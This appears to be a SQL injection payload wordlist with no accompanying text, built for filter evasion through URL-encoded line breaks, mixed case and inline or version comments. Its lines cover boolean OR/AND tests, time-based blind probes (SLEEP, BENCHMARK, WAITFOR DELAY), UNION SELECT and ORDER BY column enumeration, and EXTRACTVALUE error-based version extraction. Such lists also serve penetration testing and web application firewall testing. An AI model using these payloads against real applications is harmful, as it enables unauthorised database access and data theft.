  '"%0aoR%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'
  '"%0aoR%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0aoR%0a1=1#'
  '"%0aoR%0a1=1--'
  '"%0aoR%0a1=1--%0a-'
  '"%0aoR%0aBeNcHmArK(10000000,mD5(1))--'
  '"%0aoR%0aSlEeP(0)--'
  '"%0aoR%0aSlEeP(1)--'
  '"%0aoR%0aSlEeP(10)--'
  '"%0aoR%0aSlEeP(15)--'
  '"%0aoR%0aSlEeP(2)--'
  '"%0aoR%0aSlEeP(3)--'
  '"%0aoR%0aSlEeP(5)--'
  '"%0aoR%0d1=1--'
  '"%0aoRdEr%0abY%0a1--'
  '"%0aoRdEr%0abY%0a10--'
  '"%0aoRdEr%0abY%0a11--'
  '"%0aoRdEr%0abY%0a12--'
  '"%0aoRdEr%0abY%0a13--'
  '"%0aoRdEr%0abY%0a14--'
  '"%0aoRdEr%0abY%0a15--'
  '"%0aoRdEr%0abY%0a2--'
  '"%0aoRdEr%0abY%0a3--'
  '"%0aoRdEr%0abY%0a4--'
  '"%0aoRdEr%0abY%0a5--'
  '"%0aoRdEr%0abY%0a6--'
  '"%0aoRdEr%0abY%0a7--'
  '"%0aoRdEr%0abY%0a8--'
  '"%0aoRdEr%0abY%0a9--'
  '"%0aor%0a1=1#'
  '"%0aor%0a1=1--'
  '"%0aor%0a1=1--%0a-'
  '"%0auNiOn%0aaLl%0asElEcT%0a1,2,3,4,5--'
  '"%0auNiOn%0aaLl%0asElEcT%0a1,2,3,4--'
  '"%0auNiOn%0aaLl%0asElEcT%0a1,2,3--'
  '"%0auNiOn%0aaLl%0asElEcT%0a1,2--'
  '"%0auNiOn%0aaLl%0asElEcT%0a1--'
  '"%0auNiOn%0asElEcT%0a1,2,3,4,5--'
  '"%0auNiOn%0asElEcT%0a1,2,3,4--'
  '"%0auNiOn%0asElEcT%0a1,2,3--'
  '"%0auNiOn%0asElEcT%0a1,2--'
  '"%0auNiOn%0asElEcT%0a1--'
  '"%0auNiOn%0asElEcT%0aNuLl,nUlL,NuLl,nUlL--'
  '"%0auNiOn%0asElEcT%0aNuLl,nUlL,NuLl--'
  '"%0auNiOn%0asElEcT%0aNuLl,nUlL--'
  '"%0auNiOn%0asElEcT%0aNuLl--'
  '"%0awAiTfOr%0adElAy%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0awAiTfOr%0adElAy%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:10'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0awAiTfOr%0adElAy%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:15'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0awAiTfOr%0adElAy%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:2'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0awAiTfOr%0adElAy%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:3'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0awAiTfOr%0adElAy%0a'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''0:0:5'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0d%4F%52%0D1=1--'
  '"%0d%4F%52%0d1=1--'
  '"%0d%4f%52%0d1=1--'
  '"%0d/*!50000UNION*/%0dALL%0dSELECT%0d1,2,3,4,5--'
  '"%0d/*!50000UNION*/%0dALL%0dSELECT%0d1,2,3,4--'
  '"%0d/*!50000UNION*/%0dALL%0dSELECT%0d1,2,3--'
  '"%0d/*!50000UNION*/%0dALL%0dSELECT%0d1,2--'
  '"%0d/*!50000UNION*/%0dALL%0dSELECT%0d1--'
  '"%0d/*!50000UNION*/%0dSELECT%0d1,2,3,4,5--'
  '"%0d/*!50000UNION*/%0dSELECT%0d1,2,3,4--'
  '"%0d/*!50000UNION*/%0dSELECT%0d1,2,3--'
  '"%0d/*!50000UNION*/%0dSELECT%0d1,2--'
  '"%0d/*!50000UNION*/%0dSELECT%0d1--'
  '"%0d/*!50000UNION*/%0dSELECT%0dNULL,NULL,NULL,NULL--'
  '"%0d/*!50000UNION*/%0dSELECT%0dNULL,NULL,NULL--'
  '"%0d/*!50000UNION*/%0dSELECT%0dNULL,NULL--'
  '"%0d/*!50000UNION*/%0dSELECT%0dNULL--'
  '"%0dA/**/ND%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0dA/**/ND%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '"%0dA/**/ND%0d1=1#'
  '"%0dA/**/ND%0d1=1--'
  '"%0dA/**/ND%0d1=1--%0d-'
  '"%0dA/**/ND%0d1=2--'
  '"%0dA/**/ND%0dBENCHMARK(10000000,MD5(1))--'
  '"%0dA/**/ND%0dBENCHMARK(5000000,MD5(1))--'
  '"%0dA/**/ND%0dBENCHMARK(50000000,MD5(1))--'
  '"%0dA/**/ND%0dEXTRACTVALUE(1,CONCAT(0x7e,(SELECT%0d@@version)))--'
  '"%0dA/**/ND%0dSLEEP(0)--'
  '"%0dA/**/ND%0dSLEEP(1)--'
  '"%0dA/**/ND%0dSLEEP(10)--'
  '"%0dA/**/ND%0dSLEEP(15)--'
  '"%0dA/**/ND%0dSLEEP(2)--'
  '"%0dA/**/ND%0dSLEEP(3)--'
  '"%0dA/**/ND%0dSLEEP(5)--'
  '"%0dA/**/nD%0d1=1#'
  '"%0dA/**/nD%0d1=1--'
  '"%0dA/**/nD%0d1=1--%0d-'
  '"%0dAND%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0dAND%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '"%0dAND%0d1=1#'
  '"%0dAND%0d1=1--'
  '"%0dAND%0d1=1--%0d-'
  '"%0dAND%0d1=2--'
  '"%0dAND%0dBENC/**/HMARK(10000000,MD5(1))--'
  '"%0dAND%0dBENC/**/HMARK(5000000,MD5(1))--'
  '"%0dAND%0dBENC/**/HMARK(50000000,MD5(1))--'
  '"%0dAND%0dBENCHMARK(10000000,MD5(1))--'
  '"%0dAND%0dBENCHMARK(5000000,MD5(1))--'
  '"%0dAND%0dBENCHMARK(50000000,MD5(1))--'
  '"%0dAND%0dEXTRAC/**/TVALUE(1,CONCAT(0x7e,(SELECT%0d@@version)))--'
  '"%0dAND%0dEXTRACTVALUE(1,CONCAT(0x7e,(/*!50000SELECT*/%0d@@version)))--'
  '"%0dAND%0dEXTRACTVALUE(1,CONCAT(0x7e,(SEL/**/ECT%0d@@version)))--'
  '"%0dAND%0dEXTRACTVALUE(1,CONCAT(0x7e,(SELECT%0d@@version)))--'
  '"%0dAND%0dSL/**/EEP(0)--'
  '"%0dAND%0dSL/**/EEP(1)--'
  '"%0dAND%0dSL/**/EEP(10)--'
  '"%0dAND%0dSL/**/EEP(15)--'
  '"%0dAND%0dSL/**/EEP(2)--'
  '"%0dAND%0dSL/**/EEP(3)--'
  '"%0dAND%0dSL/**/EEP(5)--'
  '"%0dAND%0dSLEEP(0)--'
  '"%0dAND%0dSLEEP(1)--'
  '"%0dAND%0dSLEEP(10)--'
  '"%0dAND%0dSLEEP(15)--'
  '"%0dAND%0dSLEEP(2)--'
  '"%0dAND%0dSLEEP(3)--'
  '"%0dAND%0dSLEEP(5)--'
  '"%0dAnD%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0dAnD%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''2'
  '"%0dAnD%0d1=1#'
  '"%0dAnD%0d1=1--'
  '"%0dAnD%0d1=1--%0d-'
  '"%0dAnD%0d1=2--'
  '"%0dAnD%0dBeNcHmArK(10000000,mD5(1))--'
  '"%0dAnD%0dBeNcHmArK(5000000,Md5(1))--'
  '"%0dAnD%0dBeNcHmArK(50000000,mD5(1))--'
  '"%0dAnD%0dExTrAcTvAlUe(1,cOnCaT(0x7e,(SeLeCt%0D@@vErSiOn)))--'
  '"%0dAnD%0dExTrAcTvAlUe(1,cOnCaT(0x7e,(SeLeCt%0d@@vErSiOn)))--'
  '"%0dAnD%0dSlEeP(0)--'
  '"%0dAnD%0dSlEeP(1)--'
  '"%0dAnD%0dSlEeP(10)--'
  '"%0dAnD%0dSlEeP(15)--'
  '"%0dAnD%0dSlEeP(2)--'
  '"%0dAnD%0dSlEeP(3)--'
  '"%0dAnD%0dSlEeP(5)--'
  '"%0dO/**/R%091=1--'
  '"%0dO/**/R%0a1=1--'
  '"%0dO/**/R%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0dO/**/R%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '"%0dO/**/R%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0dO/**/R%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '"%0dO/**/R%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0dO/**/R%0d1=1#'
  '"%0dO/**/R%0d1=1--'
  '"%0dO/**/R%0d1=1--%0d-'
  '"%0dO/**/R%0dBENCHMARK(10000000,MD5(1))--'
  '"%0dO/**/R%0dSLEEP(0)--'
  '"%0dO/**/R%0dSLEEP(1)--'
  '"%0dO/**/R%0dSLEEP(10)--'
  '"%0dO/**/R%0dSLEEP(15)--'
  '"%0dO/**/R%0dSLEEP(2)--'
  '"%0dO/**/R%0dSLEEP(3)--'
  '"%0dO/**/R%0dSLEEP(5)--'
  '"%0dO/**/RDER%0dBY%0d1--'
  '"%0dO/**/RDER%0dBY%0d10--'
  '"%0dO/**/RDER%0dBY%0d11--'
  '"%0dO/**/RDER%0dBY%0d12--'
  '"%0dO/**/RDER%0dBY%0d13--'
  '"%0dO/**/RDER%0dBY%0d14--'
  '"%0dO/**/RDER%0dBY%0d15--'
  '"%0dO/**/RDER%0dBY%0d2--'
  '"%0dO/**/RDER%0dBY%0d3--'
  '"%0dO/**/RDER%0dBY%0d4--'
  '"%0dO/**/RDER%0dBY%0d5--'
  '"%0dO/**/RDER%0dBY%0d6--'
  '"%0dO/**/RDER%0dBY%0d7--'
  '"%0dO/**/RDER%0dBY%0d8--'
  '"%0dO/**/RDER%0dBY%0d9--'
  '"%0dO/**/r%0D1=1--'
  '"%0dO/**/r%0d1=1#'
  '"%0dO/**/r%0d1=1--'
  '"%0dO/**/r%0d1=1--%0d-'
  '"%0dOO/**/RR%0d1=1--'
  '"%0dOORR%0d1=1--'
  '"%0dOR%091=1--'
  '"%0dOR%0a1=1--'
  '"%0dOR%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0dOR%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '"%0dOR%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0dOR%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '"%0dOR%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0dOR%0d1=1#'
  '"%0dOR%0d1=1--'
  '"%0dOR%0d1=1--%0d-'
  '"%0dOR%0dBENC/**/HMARK(10000000,MD5(1))--'
  '"%0dOR%0dBENCHMARK(10000000,MD5(1))--'
  '"%0dOR%0dSL/**/EEP(0)--'
  '"%0dOR%0dSL/**/EEP(1)--'
  '"%0dOR%0dSL/**/EEP(10)--'
  '"%0dOR%0dSL/**/EEP(15)--'
  '"%0dOR%0dSL/**/EEP(2)--'
  '"%0dOR%0dSL/**/EEP(3)--'
  '"%0dOR%0dSL/**/EEP(5)--'
  '"%0dOR%0dSLEEP(0)--'
  '"%0dOR%0dSLEEP(1)--'
  '"%0dOR%0dSLEEP(10)--'
  '"%0dOR%0dSLEEP(15)--'
  '"%0dOR%0dSLEEP(2)--'
  '"%0dOR%0dSLEEP(3)--'
  '"%0dOR%0dSLEEP(5)--'
  '"%0dOR/**/DER%0dBY%0d1--'
  '"%0dOR/**/DER%0dBY%0d10--'
  '"%0dOR/**/DER%0dBY%0d11--'
  '"%0dOR/**/DER%0dBY%0d12--'
  '"%0dOR/**/DER%0dBY%0d13--'
  '"%0dOR/**/DER%0dBY%0d14--'
  '"%0dOR/**/DER%0dBY%0d15--'
  '"%0dOR/**/DER%0dBY%0d2--'
  '"%0dOR/**/DER%0dBY%0d3--'
  '"%0dOR/**/DER%0dBY%0d4--'
  '"%0dOR/**/DER%0dBY%0d5--'
  '"%0dOR/**/DER%0dBY%0d6--'
  '"%0dOR/**/DER%0dBY%0d7--'
  '"%0dOR/**/DER%0dBY%0d8--'
  '"%0dOR/**/DER%0dBY%0d9--'
  '"%0dORDER%0dBY%0d1--'
  '"%0dORDER%0dBY%0d10--'
  '"%0dORDER%0dBY%0d11--'
  '"%0dORDER%0dBY%0d12--'
  '"%0dORDER%0dBY%0d13--'
  '"%0dORDER%0dBY%0d14--'
  '"%0dORDER%0dBY%0d15--'
  '"%0dORDER%0dBY%0d2--'
  '"%0dORDER%0dBY%0d3--'
  '"%0dORDER%0dBY%0d4--'
  '"%0dORDER%0dBY%0d5--'
  '"%0dORDER%0dBY%0d6--'
  '"%0dORDER%0dBY%0d7--'
  '"%0dORDER%0dBY%0d8--'
  '"%0dORDER%0dBY%0d9--'
  '"%0dOoRr%0D1=1--'
  '"%0dOoRr%0d1=1--'
  '"%0dOr%091=1--'
  '"%0dOr%0A1=1--'
  '"%0dOr%0D'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0dOr%0D'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '"%0dOr%0D'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0dOr%0D'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'
  '"%0dOr%0D'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''X'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0dOr%0D1=1#'
  '"%0dOr%0D1=1--'
  '"%0dOr%0D1=1--%0D-'
  '"%0dOr%0DbEnChMaRk(10000000,Md5(1))--'
  '"%0dOr%0DsLeEp(0)--'
  '"%0dOr%0DsLeEp(1)--'
  '"%0dOr%0DsLeEp(10)--'
  '"%0dOr%0DsLeEp(15)--'
  '"%0dOr%0DsLeEp(2)--'
  '"%0dOr%0DsLeEp(3)--'
  '"%0dOr%0DsLeEp(5)--'
  '"%0dOr%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'
  '"%0dOr%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''#'
  '"%0dOr%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''1'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0dOr%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'
  '"%0dOr%0d'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''='\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''x'\''\'\'''\''\'\''\'\'''\'''\''\'\'''\''--'
  '"%0dOr%0d1=1#'
  '"%0dOr%0d1=1--'
  '"%0dOr%0d1=1--%0d-'
  '"%0dOr%0dbEnChMaRk(10000000,Md5(1))--'
  '"%0dOr%0dsLeEp(0)--'
  '"%0dOr%0dsLeEp(1)--'
  '"%0dOr%0dsLeEp(10)--'
  '"%0dOr%0dsLeEp(15)--'
  '"%0dOr%0dsLeEp(2)--'
  '"%0dOr%0dsLeEp(3)--'
  '"%0dOr%0dsLeEp(5)--'
  '"%0dOrDeR%0dBy%0D1--'
  '"%0dOrDeR%0dBy%0D10--'
  '"%0dOrDeR%0dBy%0D11--'
  '"%0dOrDeR%0dBy%0D12--'
  '"%0dOrDeR%0dBy%0D13--'
  '"%0dOrDeR%0dBy%0D14--'
  '"%0dOrDeR%0dBy%0D15--'
  '"%0dOrDeR%0dBy%0D2--'
  '"%0dOrDeR%0dBy%0D3--'
  '"%0dOrDeR%0dBy%0D4--'
  '"%0dOrDeR%0dBy%0D5--'
  '"%0dOrDeR%0dBy%0D6--'
  '"%0dOrDeR%0dBy%0D7--'
  '"%0dOrDeR%0dBy%0D8--'
  '"%0dOrDeR%0dBy%0D9--'
  '"%0dOrDeR%0dBy%0d1--'
  '"%0dOrDeR%0dBy%0d10--'
  '"%0dOrDeR%0dBy%0d11--'
  '"%0dOrDeR%0dBy%0d12--'
  '"%0dOrDeR%0dBy%0d13--'
  '"%0dOrDeR%0dBy%0d14--'
  '"%0dOrDeR%0dBy%0d15--'
  '"%0dOrDeR%0dBy%0d2--'
  '"%0dOrDeR%0dBy%0d3--'
  '"%0dOrDeR%0dBy%0d4--'
  '"%0dOrDeR%0dBy%0d5--'
  '"%0dOrDeR%0dBy%0d6--'
  '"%0dOrDeR%0dBy%0d7--'
  '"%0dOrDeR%0dBy%0d8--'
  '"%0dOrDeR%0dBy%0d9--'
  '"%0dUN/**/ION%0dALL%0dSELECT%0d1,2,3,4,5--'
  '"%0dUN/**/ION%0dALL%0dSELECT%0d1,2,3,4--'
  '"%0dUN/**/ION%0dALL%0dSELECT%0d1,2,3--'
  '"%0dUN/**/ION%0dALL%0dSELECT%0d1,2--'
  '"%0dUN/**/ION%0dALL%0dSELECT%0d1--'
  '"%0dUN/**/ION%0dSELECT%0d1,2,3,4,5--'
  '"%0dUN/**/ION%0dSELECT%0d1,2,3,4--'
  '"%0dUN/**/ION%0dSELECT%0d1,2,3--'
  '"%0dUN/**/ION%0dSELECT%0d1,2--'
  '"%0dUN/**/ION%0dSELECT%0d1--'
  '"%0dUN/**/ION%0dSELECT%0dNULL,NULL,NULL,NULL--'
  '"%0dUN/**/ION%0dSELECT%0dNULL,NULL,NULL--'
  '"%0dUN/**/ION%0dSELECT%0dNULL,NULL--'
  '"%0dUN/**/ION%0dSELECT%0dNULL--'
  '"%0dUNION%0d/*!50000SELECT*/%0d1,2,3,4,5--'
  '"%0dUNION%0d/*!50000SELECT*/%0d1,2,3,4--'
  '"%0dUNION%0d/*!50000SELECT*/%0d1,2,3--'
  '"%0dUNION%0d/*!50000SELECT*/%0d1,2--'
  '"%0dUNION%0d/*!50000SELECT*/%0d1--'
  '"%0dUNION%0d/*!50000SELECT*/%0dNULL,NULL,NULL,NULL--'
  '"%0dUNION%0d/*!50000SELECT*/%0dNULL,NULL,NULL--'
  '"%0dUNION%0d/*!50000SELECT*/%0dNULL,NULL--'
true
